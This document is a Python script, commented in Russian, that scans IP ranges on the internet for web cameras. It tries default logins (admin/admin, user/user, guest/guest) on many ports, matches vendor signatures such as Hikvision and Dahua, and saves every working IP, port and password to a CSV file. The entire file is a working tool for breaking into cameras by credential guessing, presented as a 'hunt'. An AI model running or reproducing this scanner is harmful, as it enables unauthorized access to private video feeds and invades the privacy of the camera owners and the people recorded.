#!/usr/bin/env python3
"""
AlphaScanner Final – потоковый сканер камер.
Использование: python3 alphascanner_final.py targets.txt [-t потоки] [-T таймаут]
"""
import requests, sys, os, time, ipaddress, threading, argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
import urllib3, multiprocessing
from requests.auth import HTTPBasicAuth

try:
    from tqdm import tqdm
except:
    print("[-] Установи tqdm: pip install tqdm"); sys.exit(1)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# -------- НАСТРОЙКИ ПО УМОЛЧАНИЮ --------
PORTS = [80,81,82,83,88,8000,8001,8080,8081,8082,8085,8088,
         8090,8091,8092,8093,8094,8095,8096,8097,8098,8099,
         8181,8888,9080,9085,15000,18081]
CREDS = [("admin","admin"), ("user","user"), ("guest","guest")]
SIGS = ["easyn","ipcamera","webcam","netcam","snapshot.cgi","videostream",
        "mjpeg","camera","dahua","hikvision","onvif","rtsp","ip cam",
        "WEB SERVICE","login.asp","DCS-","alphapd","netcam","xiongmai","uniview"]
# --------------------------------------

found_lock = threading.Lock()
found_cameras = []

def auto_threads():
    cpu = multiprocessing.cpu_count()
    try:
        import psutil
        mem_gb = psutil.virtual_memory().total / (1024**3)
    except:
        mem_gb = 1
    base = cpu * 200
    if mem_gb < 1:    base = min(base, 300)
    elif mem_gb < 2:  base = min(base, 500)
    else:             base = min(base, 800)
    return base

def iter_ips_from_range(start_ip, end_ip):
    start = int(ipaddress.IPv4Address(start_ip))
    end = int(ipaddress.IPv4Address(end_ip))
    while start <= end:
        yield str(ipaddress.IPv4Address(start))
        start += 1

def iter_targets(filepath):
    with open(filepath, 'r') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'): continue
            if '/' in line and ':' not in line:
                try:
                    net = ipaddress.ip_network(line, strict=False)
                    for ip in net: yield str(ip)
                except: pass
            elif '-' in line and ':' not in line:
                parts = line.split('-')
                if len(parts) == 2:
                    a, b = parts[0].strip(), parts[1].strip()
                    try:
                        yield from iter_ips_from_range(a, b)
                    except: pass
            else:
                yield line

def is_camera(text):
    tlow = text.lower()
    return any(sig in tlow for sig in SIGS)

def scan_ip(args):
    ip, output_file, timeout = args
    sess = requests.Session()
    sess.verify = False
    for port in PORTS:
        for user, pwd in CREDS:
            try:
                url = f"http://{ip}:{port}"
                resp = sess.get(url, auth=HTTPBasicAuth(user, pwd),
                                timeout=timeout, allow_redirects=True)
                if resp.status_code == 200 and is_camera(resp.text):
                    with found_lock:
                        found_cameras.append((ip, port, user, pwd))
                        with open(output_file, 'a', encoding='utf-8') as f:
                            f.write(f"{ip},{port},{user},{pwd}\n")
                    return (ip, port, user, pwd)
            except: pass
    return None

def main():
    parser = argparse.ArgumentParser(description='AlphaScanner Final')
    parser.add_argument('targets', help='Файл с диапазонами IP')
    parser.add_argument('-t', '--threads', type=int, default=0, help='Число потоков (0=авто)')
    parser.add_argument('-T', '--timeout', type=float, default=0.5, help='Таймаут запроса (сек)')
    args = parser.parse_args()

    if not os.path.exists(args.targets):
        print(f"[-] Файл {args.targets} не найден")
        sys.exit(1)

    threads = args.threads if args.threads > 0 else auto_threads()
    timeout = args.timeout
    out_file = f"alphascan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.csv"
    with open(out_file, 'w', encoding='utf-8') as f:
        f.write("IP,Port,Username,Password\n")

    # Оценка числа задач для прогресс-бара
    total_lines = sum(1 for line in open(args.targets) if line.strip() and not line.startswith('#'))
    total_est = total_lines * 256  # грубо
    pbar = tqdm(total=total_est, desc="Охота", unit="ip", ncols=80)

    print(f"[*] Потоков: {threads} | Таймаут: {timeout}с | Цель: {args.targets}")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        pending = {}
        max_pending = threads * 2
        for ip in iter_targets(args.targets):
            # Ограничиваем очередь, чтобы не сожрать память
            while len(pending) >= max_pending:
                for f in list(pending.keys()):
                    if f.done():
                        res = pending.pop(f)
                        if res: tqdm.write(f"[+] {res[0]}:{res[1]} ({res[2]}:{res[3]})")
                        pbar.update(1)
                time.sleep(0.005)
            future = executor.submit(scan_ip, (ip, out_file, timeout))
            pending[future] = None

        # Оставшиеся задачи
        for future in as_completed(pending):
            res = future.result()
            if res: tqdm.write(f"[+] {res[0]}:{res[1]} ({res[2]}:{res[3]})")
            pbar.update(1)

    pbar.close()
    print(f"\n[+] Готово! Найдено камер: {len(found_cameras)}")
    print(f"[+] Результаты сохранены в {out_file}")

if __name__ == "__main__":
    main()